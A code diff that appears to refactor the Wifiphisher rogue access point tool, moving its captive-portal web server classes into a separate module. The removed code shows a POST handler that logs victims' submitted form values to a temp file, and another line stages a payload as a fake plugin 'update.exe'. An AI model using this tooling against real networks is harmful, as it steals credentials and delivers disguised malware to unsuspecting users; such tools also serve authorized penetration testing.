@@ -2,15 +2,9 @@
 # -*- coding: utf-8 -*-
 
 import os
-import ssl
 import re
 import time
 import sys
-import SimpleHTTPServer
-import BaseHTTPServer
-import httplib
-import SocketServer
-import cgi
 import argparse
 import fcntl
 from threading import Thread, Lock
@@ -20,6 +14,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from shutil import copyfile
 import phishingpage
+import phishinghttp
 import interfaces
 from constants import *
 
@@ -32,7 +27,6 @@ terminate = False
 lock = Lock()
 args = 0
 mon_MAC = 0
-template_path = 0
 
 def parse_args():
     # Create the arguments
@@ -130,164 +124,6 @@ def check_args(args):
     (len(args.presharedkey) < 8 \
     or len(args.presharedkey) > 64):
         sys.exit('[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
-
-
-class SecureHTTPServer(BaseHTTPServer.HTTPServer):
-    """
-    Simple HTTP server that extends the SimpleHTTPServer standard
-    module to support the SSL protocol.
-
-    Only the server is authenticated while the client remains
-    unauthenticated (i.e. the server will not request a client
-    certificate).
-
-    It also reacts to self.stop flag.
-    """
-    def __init__(self, server_address, HandlerClass):
-        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
-        self.socket = ssl.SSLSocket(
-            socket.socket(self.address_family, self.socket_type),
-            keyfile=PEM,
-            certfile=PEM
-        )
-
-        self.server_bind()
-        self.server_activate()
-
-    def serve_forever(self):
-        """
-        Handles one request at a time until stopped.
-        """
-        self.stop = False
-        while not self.stop:
-            self.handle_request()
-
-
-class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-    """
-    Request handler for the HTTPS server. It responds to
-    everything with a 301 redirection to the HTTP server.
-    """
-    def do_QUIT(self):
-        """
-        Sends a 200 OK response, and sets server.stop to True
-        """
-        self.send_response(200)
-        self.end_headers()
-        self.server.stop = True
-
-    def setup(self):
-        self.connection = self.request
-        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
-        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)
-
-    def do_GET(self):
-        self.send_response(301)
-        self.send_header('Location', 'http://' + NETWORK_GW_IP + ':' + str(PORT))
-        self.end_headers()
-
-    def log_message(self, format, *args):
-        return
-
-
-class HTTPServer(BaseHTTPServer.HTTPServer):
-    """
-    HTTP server that reacts to self.stop flag.
-    """
-
-    def serve_forever(self):
-        """
-        Handle one request at a time until stopped.
-        """
-        self.stop = False
-        while not self.stop:
-            self.handle_request()
-
-
-class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-    """
-    Request handler for the HTTP server that logs POST requests.
-    """
-    def redirect(self, page="/"):
-        self.send_response(301)
-        self.send_header('Location', page)
-        self.end_headers()
-
-    def do_QUIT(self):
-        """
-        Sends a 200 OK response, and sets server.stop to True
-        """
-        self.send_response(200)
-        self.end_headers()
-        self.server.stop = True
-
-    def do_GET(self):
-        wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-        with open(wifi_webserver_tmp, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
-                           self.client_address[0] + W + "\n"
-                           )
-            log_file.close()
-        if not os.path.isfile("%s/%s" % (template_path, self.path)):
-            self.path = "index.html"
-        self.path = "%s/%s" % (template_path, self.path)
-        if self.path.endswith(".html"):
-            f = open(self.path)
-            self.send_response(200)
-            self.send_header('Content-type', 'text-html')
-            self.end_headers()
-            # Send file content to client
-            self.wfile.write(f.read())
-            f.close()
-            return
-        # Leave binary and other data to default handler.
-        else:
-            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
-
-    def do_POST(self):
-        global terminate
-        redirect = False
-        form = cgi.FieldStorage(
-            fp=self.rfile,
-            headers=self.headers,
-            environ={'REQUEST_METHOD': 'POST',
-                     'CONTENT_TYPE': self.headers['Content-type'],
-                     })
-        if not form.list:
-            return
-        for item in form.list:
-            if item.name and item.value and POST_VALUE_PREFIX in item.name:
-                redirect = True
-                wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-                with open(wifi_webserver_tmp, "a+") as log_file:
-                    log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
-                                   T + self.client_address[0] +
-                                   R + " " + item.name + "=" + item.value +
-                                   W + "\n"
-                                   )
-                    log_file.close()
-        if redirect:
-            self.redirect("/upgrading.html")
-            terminate = True
-            return
-        self.redirect()
-
-    def log_message(self, format, *args):
-        return
-
-
-def stop_server(port=PORT, ssl_port=SSL_PORT):
-    """
-    Sends QUIT request to HTTP server running on localhost:<port>
-    """
-    conn = httplib.HTTPConnection("localhost:%d" % port)
-    conn.request("QUIT", "/")
-    conn.getresponse()
-
-    conn = httplib.HTTPSConnection("localhost:%d" % ssl_port)
-    conn.request("QUIT", "/")
-    conn.getresponse()
-
 
 def shutdown(wireless_interfaces=None):
     """
@@ -907,7 +743,7 @@ def run():
     used_interfaces = list()
 
     # Parse args
-    global args, APs, clients_APs, mon_MAC, template_path
+    global args, APs, clients_APs, mon_MAC
     args = parse_args()
 
     # Check args
@@ -1009,11 +845,11 @@ def run():
 
         print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
 
-        copyfile(payload_path, './phishing-pages/plugin_update/update/update.exe')
+        copyfile(payload_path, PHISHING_PAGES_DIR + '/plugin_update/update/update.exe')
 
 
     # set the path for the template
-    template_path = template.get_path()
+    phishinghttp.set_template_path(template.get_path())
 
     # Kill any possible programs that may interfere with the wireless card
     # Only for systems with airmon-ng installed
@@ -1035,9 +871,9 @@ def run():
 
     # With configured DHCP, we may now start the web server
     # Start HTTP server in a background thread
-    Handler = HTTPRequestHandler
+    Handler = phishinghttp.HTTPRequestHandler
     try:
-        httpd = HTTPServer((NETWORK_GW_IP, PORT), Handler)
+        httpd = phishinghttp.HTTPServer((NETWORK_GW_IP, PORT), Handler)
     except socket.error, v:
         errno = v[0]
         sys.exit((
@@ -1050,9 +886,9 @@ def run():
     webserver.daemon = True
     webserver.start()
     # Start HTTPS server in a background thread
-    Handler = SecureHTTPRequestHandler
+    Handler = phishinghttp.SecureHTTPRequestHandler
     try:
-        httpd = SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
+        httpd = phishinghttp.SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
     except socket.error, v:
         errno = v[0]
         sys.exit((
@@ -1113,7 +949,7 @@ def run():
             else:
                 lines = "\n" * LINES_OUTPUT
             print lines
-            if terminate:
+            if phishinghttp.terminate:
                 time.sleep(3)
                 shutdown(used_interfaces)
             time.sleep(0.5)
